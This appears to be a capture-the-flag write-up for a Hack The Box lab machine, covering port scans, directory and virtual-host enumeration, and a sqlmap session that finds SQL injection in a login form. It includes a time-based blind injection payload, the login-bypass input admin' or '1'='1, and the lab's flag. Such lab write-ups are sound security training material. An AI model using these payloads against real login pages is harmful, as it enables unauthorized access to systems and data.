# Target: Appointment

- IP Address: 10.129.106.17
- Starting Domain Name: target.htb

## Scope & Goal
- Objective: user.txt, root.txt
- Constraints: lab

# Recon
- Quick TCP:

```bash
$ nmap target.htb                       
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-09 13:38 -0400
Nmap scan report for target.htb (10.129.106.17)
Host is up (0.068s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 1.32 seconds
```

- Targeted Scan:

```bash
$ nmap target.htb -sV -sC -A -p80 -vv   
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-09 13:38 -0400
NSE: Loaded 158 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:38
Completed NSE at 13:38, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:38
Completed NSE at 13:38, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:38
Completed NSE at 13:38, 0.00s elapsed
Initiating Ping Scan at 13:38
Scanning target.htb (10.129.106.17) [4 ports]
Completed Ping Scan at 13:38, 0.09s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 13:38
Scanning target.htb (10.129.106.17) [1 port]
Discovered open port 80/tcp on 10.129.106.17
Completed SYN Stealth Scan at 13:38, 0.08s elapsed (1 total ports)
Initiating Service scan at 13:38
Scanning 1 service on target.htb (10.129.106.17)
Completed Service scan at 13:38, 6.20s elapsed (1 service on 1 host)
Initiating OS detection (try #1) against target.htb (10.129.106.17)
Initiating Traceroute at 13:38
Completed Traceroute at 13:38, 0.06s elapsed
Initiating Parallel DNS resolution of 1 host. at 13:38
Completed Parallel DNS resolution of 1 host. at 13:38, 0.50s elapsed
NSE: Script scanning 10.129.106.17.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:38
Completed NSE at 13:38, 2.13s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:38
Completed NSE at 13:38, 0.27s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:38
Completed NSE at 13:38, 0.01s elapsed
Nmap scan report for target.htb (10.129.106.17)
Host is up, received echo-reply ttl 63 (0.069s latency).
Scanned at 2026-04-09 13:38:41 EDT for 11s

PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.38 ((Debian))
|_http-title: Login
|_http-server-header: Apache/2.4.38 (Debian)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 7D4140C76BF7648531683BFA4F7F8C22
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
TCP/IP fingerprint:
OS:SCAN(V=7.98%E=4%D=4/9%OT=80%CT=%CU=36814%PV=Y%DS=2%DC=T%G=N%TM=69D7E42C%
OS:P=x86_64-pc-linux-gnu)SEQ(SP=109%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS(O
OS:1=M552ST11NW7%O2=M552ST11NW7%O3=M552NNT11NW7%O4=M552ST11NW7%O5=M552ST11N
OS:W7%O6=M552ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R
OS:=Y%DF=Y%T=40%W=FAF0%O=M552NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%
OS:RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y
OS:%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R
OS:%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=
OS:40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S
OS:)

Uptime guess: 22.056 days (since Wed Mar 18 12:17:38 2026)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=265 (Good luck!)
IP ID Sequence Generation: All zeros

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   60.58 ms 10.10.14.1
2   61.13 ms target.htb (10.129.106.17)

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:38
Completed NSE at 13:38, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:38
Completed NSE at 13:38, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:38
Completed NSE at 13:38, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.69 seconds
           Raw packets sent: 37 (2.414KB) | Rcvd: 26 (1.790KB)
```

- Full TCP:

```bash
$ nmap target.htb -sC -sV -A -T4 -vv -p-
...
Same as Targeted Scan above
```

## Open Services
- 80/http

## Web Enum
- Tech: Apache httpd 2.4.38
- Directory Enumeration:

```bash
$ gobuster dir -u http://target.htb -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt 
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://target.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
images               (Status: 301) [Size: 309] [--> http://target.htb/images/]
css                  (Status: 301) [Size: 306] [--> http://target.htb/css/]
js                   (Status: 301) [Size: 305] [--> http://target.htb/js/]
vendor               (Status: 301) [Size: 309] [--> http://target.htb/vendor/]
fonts                (Status: 301) [Size: 308] [--> http://target.htb/fonts/]
server-status        (Status: 403) [Size: 275]
Progress: 207641 / 207641 (100.00%)
===============================================================
Finished
===============================================================
```

- VHost Enumeration:

```bash
ffuf -H "Host: FUZZ.target.htb" -H "User-Agent: PENTEST" -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u http://target.htb -fs 4896

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://target.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 :: Header           : Host: FUZZ.target.htb
 :: Header           : User-Agent: PENTEST
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 4896
________________________________________________

:: Progress: [26583/26583] :: Job [1/1] :: 303 req/sec :: Duration: [0:00:46] :: Errors: 1 ::
```

- Params/Endpoints:

The site has a single endpoint with a login form. I captured the following request in Burp Suite and saved it to a file called `requests.txt`:

```text
POST / HTTP/1.1
Host: target.htb
Content-Length: 29
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://target.htb
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://target.htb/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

username=admin&password=admi
```

I used this request to see if the endpoint was vulnerable to SQL injection. I ran the following command:

```bash
$ sqlmap -r request.txt           
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.9.12#stable}
|_ -| . [(]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 11:00:00 /2026-04-11/

[11:00:00] [INFO] parsing HTTP request from 'request.txt'
[11:00:00] [INFO] testing connection to the target URL
[11:00:00] [INFO] checking if the target is protected by some kind of WAF/IPS
[11:00:01] [INFO] testing if the target URL content is stable
[11:00:01] [INFO] target URL content is stable
[11:00:01] [INFO] testing if POST parameter 'username' is dynamic
[11:00:01] [WARNING] POST parameter 'username' does not appear to be dynamic
[11:00:01] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
[11:00:01] [INFO] testing for SQL injection on POST parameter 'username'
[11:00:01] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[11:00:02] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[11:00:02] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[11:00:03] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[11:00:03] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[11:00:03] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[11:00:04] [INFO] testing 'Generic inline queries'
[11:00:04] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[11:00:04] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[11:00:05] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[11:00:05] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[11:00:15] [INFO] POST parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] 

for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] 

[11:00:25] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[11:00:25] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[11:00:27] [INFO] target URL appears to be UNION injectable with 3 columns
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] 

[11:00:37] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
[11:00:37] [INFO] checking if the injection point on POST parameter 'username' is a false positive
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 

sqlmap identified the following injection point(s) with a total of 95 HTTP(s) requests:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 3276 FROM (SELECT(SLEEP(5)))iuWc) AND 'PplW'='PplW&password=admin
---
[11:00:57] [INFO] the back-end DBMS is MySQL
[11:00:57] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] 
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[11:01:06] [INFO] fetched data logged to text files under '/home/kwmd/.local/share/sqlmap/output/target.htb'

[*] ending @ 11:01:06 /2026-04-11/
```

The `username` field of the form is vulnerable to SQL injection. I provide the following username and password to log in:

- username: `admin' or '1'='1`
- password: `dummy value`

I am greeted with a page that has the following:

```text
Congratulations!

Your flag is: e3d0796d002a446c0e622226f42e9672
```

## Flags
- root: `e3d0796d002a446c0e622226f42e9672` (Sat Apr 11 04:11:58 PM UTC 2026)

## Lessons
- Dead Ends: I ran directory and vhost enumeration very early on instead of trying sqlmap.
- Reusable Commands:

```bash
sqlmap -r request.txt

gobuster dir -u http://target.htb -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt

ffuf -H "Host: FUZZ.target.htb" -H "User-Agent: PENTEST" -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u http://target.htb -fs 4896
```
